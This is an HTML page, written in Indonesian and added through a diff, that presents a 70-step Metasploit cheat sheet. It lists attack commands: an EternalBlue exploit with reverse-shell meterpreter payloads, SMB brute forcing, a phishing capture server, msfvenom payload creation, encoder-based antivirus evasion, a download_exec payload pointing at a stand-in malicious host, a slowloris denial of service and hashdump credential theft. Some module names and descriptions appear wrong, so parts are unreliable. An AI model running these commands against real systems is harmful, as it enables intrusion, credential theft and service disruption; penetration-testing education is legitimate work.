@@ -1,0 +1,446 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cheat Sheet Metasploit - Nofrinto Flory - Syber9</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <style>
+        body {
+            background-color: #121212;
+            color: #00ff00;
+            font-family: 'Courier New', Courier, monospace;
+        }
+        h1, h2 {
+            color: #00ff00;
+            text-align: center;
+        }
+        .container {
+            margin-top: 20px;
+            max-width: 800px;
+        }
+        pre {
+            background-color: #1e1e1e;
+            padding: 10px;
+            border: 1px solid #00ff00;
+            overflow-x: auto;
+        }
+        .footer {
+            margin-top: 20px;
+            text-align: center;
+            color: #00ff00;
+        }
+        .navbar {
+            background: rgba(0, 0, 0, 0.8);
+            border-bottom: 1px solid #00ff00;
+        }
+        .navbar-nav .nav-link {
+            color: #00ff00 !important;
+        }
+        .navbar-nav .nav-link:hover {
+            background-color: #262626;
+        }
+    </style>
+</head>
+<body>
+    <!-- Navbar -->
+    <nav class="navbar navbar-expand-lg navbar-dark">
+        <div class="container">
+            <a class="navbar-brand" href="#">
+                <img style="border-radius: 100%;" src="./image/bg1.webp" alt="Nofrinto Flory" width="30" height="30">
+                Metasploit
+            </a>
+            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
+                <span class="navbar-toggler-icon"></span>
+            </button>
+            <div class="collapse navbar-collapse" id="navbarNav">
+                <ul class="navbar-nav ms-auto">
+                    <li class="nav-item">
+                        <a class="nav-link" href="#pengantar">Pengenalan</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="#contoh">70 Contoh Penggunaan</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="#catatan">Catatan Penting</a>
+                    </li>
+                </ul>
+            </div>
+        </div>
+    </nav>
+
+    <div class="container">
+        <h1>Cheat Sheet Metasploit</h1>
+
+        <h2 id="pengantar">Pengenalan</h2>
+        <pre>
+Metasploit adalah framework pengujian penetrasi yang digunakan untuk mengembangkan dan mengeksekusi eksploitasi terhadap sistem yang rentan. Ini sangat berguna untuk pengujian keamanan dan penelitian.
+        </pre>
+
+        <h2 id="contoh">70 Contoh Penggunaan</h2>
+
+        <h3>1. Memulai Metasploit</h3>
+        <pre>
+msfconsole
+        </pre>
+
+        <h3>2. Melihat semua modul eksploit</h3>
+        <pre>
+search type:exploit
+        </pre>
+
+        <h3>3. Memilih modul eksploit</h3>
+        <pre>
+use exploit/windows/smb/ms17_010_eternalblue
+        </pre>
+
+        <h3>4. Melihat opsi modul eksploit</h3>
+        <pre>
+show options
+        </pre>
+
+        <h3>5. Mengatur target IP</h3>
+        <pre>
+set RHOSTS 192.168.1.1
+        </pre>
+
+        <h3>6. Mengatur port target</h3>
+        <pre>
+set RPORT 445
+        </pre>
+
+        <h3>7. Mengatur payload yang akan digunakan</h3>
+        <pre>
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+        </pre>
+
+        <h3>8. Mengatur alamat IP untuk koneksi balik</h3>
+        <pre>
+set LHOST 192.168.1.2
+        </pre>
+
+        <h3>9. Menjalankan eksploit</h3>
+        <pre>
+exploit
+        </pre>
+
+        <h3>10. Melihat semua payload yang tersedia</h3>
+        <pre>
+show payloads
+        </pre>
+
+        <h3>11. Menjalankan sesi meterpreter</h3>
+        <pre>
+sessions -i 1
+        </pre>
+
+        <h3>12. Menampilkan informasi tentang sesi</h3>
+        <pre>
+info
+        </pre>
+
+        <h3>13. Mengambil screenshot dari sesi meterpreter</h3>
+        <pre>
+screenshot
+        </pre>
+
+        <h3>14. Mengambil file dari target</h3>
+        <pre>
+download /path/to/file
+        </pre>
+
+        <h3>15. Mengunggah file ke target</h3>
+        <pre>
+upload /path/to/local/file /path/to/target/file
+        </pre>
+
+        <h3>16. Melihat informasi sistem target</h3>
+        <pre>
+sysinfo
+        </pre>
+
+        <h3>17. Menjalankan perintah shell pada target</h3>
+        <pre>
+shell
+        </pre>
+
+        <h3>18. Mencetak daftar pengguna pada sistem target</h3>
+        <pre>
+net user
+        </pre>
+
+        <h3>19. Menjalankan perintah di background</h3>
+        <pre>
+run -j
+        </pre>
+
+        <h3>20. Menghentikan sesi yang berjalan</h3>
+        <pre>
+exit
+        </pre>
+
+        <h3>21. Menggunakan auxiliary untuk pemindaian</h3>
+        <pre>
+use auxiliary/scanner/portscan/tcp
+        </pre>
+
+        <h3>22. Menjalankan pemindaian port</h3>
+        <pre>
+run
+        </pre>
+
+        <h3>23. Mengatur timeout untuk koneksi</h3>
+        <pre>
+set TIMEOUT 5
+        </pre>
+
+        <h3>24. Mencetak semua modul yang tersedia</h3>
+        <pre>
+show all
+        </pre>
+
+        <h3>25. Mengatur payload untuk mengirimkan reverse shell</h3>
+        <pre>
+set PAYLOAD cmd/unix/reverse
+        </pre>
+
+        <h3>26. Mengatur opsi brute force</h3>
+        <pre>
+use auxiliary/scanner/smb/smb_login
+        </pre>
+
+        <h3>27. Mengatur file password untuk brute force</h3>
+        <pre>
+set PASS_FILE /path/to/password/file
+        </pre>
+
+        <h3>28. Mengatur user untuk brute force</h3>
+        <pre>
+set USER_FILE /path/to/user/file
+        </pre>
+
+        <h3>29. Menjalankan pemindaian brute force</h3>
+        <pre>
+run
+        </pre>
+
+        <h3>30. Menggunakan meterpreter untuk mengeksekusi perintah</h3>
+        <pre>
+execute -f /path/to/program
+        </pre>
+
+        <h3>31. Menampilkan semua sesi yang aktif</h3>
+        <pre>
+sessions
+        </pre>
+
+        <h3>32. Mengatur payload untuk aplikasi web</h3>
+        <pre>
+set PAYLOAD php/meterpreter/reverse_tcp
+        </pre>
+
+        <h3>33. Melihat semua modul eksploitas yang dapat digunakan untuk aplikasi web</h3>
+        <pre>
+search web
+        </pre>
+
+        <h3>34. Menggunakan Metasploit untuk serangan SQL Injection</h3>
+        <pre>
+use auxiliary/scanner/sql/sqlmap
+        </pre>
+
+        <h3>35. Mengatur URL target untuk serangan SQL Injection</h3>
+        <pre>
+set TARGET_URL http://example.com/vulnerable.php?id=1
+        </pre>
+
+        <h3>36. Menjalankan serangan SQL Injection</h3>
+        <pre>
+run
+        </pre>
+
+        <h3>37. Menyimpan hasil eksploit ke file</h3>
+        <pre>
+set OUTPUT_FILE /path/to/output/file
+        </pre>
+
+        <h3>38. Menggunakan Post-Exploitation untuk pengumpulan informasi</h3>
+        <pre>
+use post/multi/gather/enum_system
+        </pre>
+
+        <h3>39. Menjalankan pengumpulan informasi setelah eksploitasi</h3>
+        <pre>
+run
+        </pre>
+
+        <h3>40. Menggunakan modul untuk bypass antivirus</h3>
+        <pre>
+use exploit/windows/fileformat/exe
+        </pre>
+
+        <h3>41. Menggunakan Metasploit untuk mengatur serangan phishing</h3>
+        <pre>
+use auxiliary/server/capture/http
+        </pre>
+
+        <h3>42. Mengatur URL untuk serangan phishing</h3>
+        <pre>
+set URIPATH /phishing
+        </pre>
+
+        <h3>43. Menjalankan server phishing</h3>
+        <pre>
+run
+        </pre>
+
+        <h3>44. Mengatur payload untuk aplikasi mobile</h3>
+        <pre>
+set PAYLOAD android/meterpreter/reverse_tcp
+        </pre>
+
+        <h3>45. Menjalankan serangan terhadap aplikasi mobile</h3>
+        <pre>
+run
+        </pre>
+
+        <h3>46. Mencetak laporan sesi</h3>
+        <pre>
+report -t html -o /path/to/report.html
+        </pre>
+
+        <h3>47. Mengatur antarmuka pengguna (UI) untuk Metasploit</h3>
+        <pre>
+msfconsole -r /path/to/script.rc
+        </pre>
+
+        <h3>48. Menggunakan msfvenom untuk membuat payload</h3>
+        <pre>
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=4444 -f exe > payload.exe
+        </pre>
+
+        <h3>49. Menjalankan payload yang dibuat</h3>
+        <pre>
+./payload.exe
+        </pre>
+
+        <h3>50. Menggunakan Metasploit untuk pemindaian kerentanan</h3>
+        <pre>
+use auxiliary/scanner/vuln/ms17_010_eternalblue
+        </pre>
+
+        <h3>51. Mengatur target IP untuk pemindaian kerentanan</h3>
+        <pre>
+set RHOSTS 192.168.1.1
+        </pre>
+
+        <h3>52. Menjalankan pemindaian kerentanan</h3>
+        <pre>
+run
+        </pre>
+
+        <h3>53. Menggunakan Metasploit untuk eksploitasi web</h3>
+        <pre>
+use exploit/unix/webapp/wordpress_sqli
+        </pre>
+
+        <h3>54. Mengatur URL target untuk eksploitasi web</h3>
+        <pre>
+set TARGET_URL http://example.com/wp-admin/admin.php
+        </pre>
+
+        <h3>55. Menjalankan eksploitasi web</h3>
+        <pre>
+run
+        </pre>
+
+        <h3>56. Menampilkan hasil log sesi</h3>
+        <pre>
+log
+        </pre>
+
+        <h3>57. Mengatur shell ke command shell</h3>
+        <pre>
+shell
+        </pre>
+
+        <h3>58. Menggunakan Metasploit untuk mengelola sesi</h3>
+        <pre>
+sessions -l
+        </pre>
+
+        <h3>59. Mengubah ke sesi lain</h3>
+        <pre>
+sessions -i <session_id>
+        </pre>
+
+        <h3>60. Menggunakan encoder untuk menyembunyikan payload</h3>
+        <pre>
+set ENCODER x86/shikata_ga_nai
+        </pre>
+
+        <h3>61. Menggunakan Metasploit untuk membongkar password</h3>
+        <pre>
+use auxiliary/gather/enum_users
+        </pre>
+
+        <h3>62. Mengatur payload untuk mengunduh malware</h3>
+        <pre>
+set PAYLOAD windows/download_exec
+        </pre>
+
+        <h3>63. Mengatur URL untuk unduhan malware</h3>
+        <pre>
+set DOWNLOAD_URL http://malicious.com/malware.exe
+        </pre>
+
+        <h3>64. Menjalankan unduhan malware</h3>
+        <pre>
+run
+        </pre>
+
+        <h3>65. Menggunakan Metasploit untuk serangan DoS</h3>
+        <pre>
+use auxiliary/dos/http/slowloris
+        </pre>
+
+        <h3>66. Mengatur target untuk serangan DoS</h3>
+        <pre>
+set RHOST 192.168.1.1
+        </pre>
+
+        <h3>67. Menjalankan serangan DoS</h3>
+        <pre>
+run
+        </pre>
+
+        <h3>68. Mencetak semua informasi yang terkumpul dari sesi</h3>
+        <pre>
+hashdump
+        </pre>
+
+        <h3>69. Menjalankan pengumpulan informasi jaringan</h3>
+        <pre>
+run post/windows/gather/enum_network
+        </pre>
+
+        <h3>70. Menghentikan semua sesi</h3>
+        <pre>
+sessions -K
+        </pre>
+
+        <h2 id="catatan">Catatan Penting</h2>
+        <pre>
+- Gunakan Metasploit secara etis dan legal; selalu dapatkan izin sebelum melakukan pengujian keamanan.
+- Banyak modul dan eksploit dapat berisiko; pastikan untuk memahami konsekuensi sebelum menjalankannya.
+- Perbarui Metasploit secara teratur untuk mendapatkan modul dan eksploit terbaru.
+        </pre>
+    </div>
+
+    <div class="footer">
+        <p>&copy; 2024 Nofrinto Flory - Cheat Sheet Metasploit</p>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+</body>
+</html>
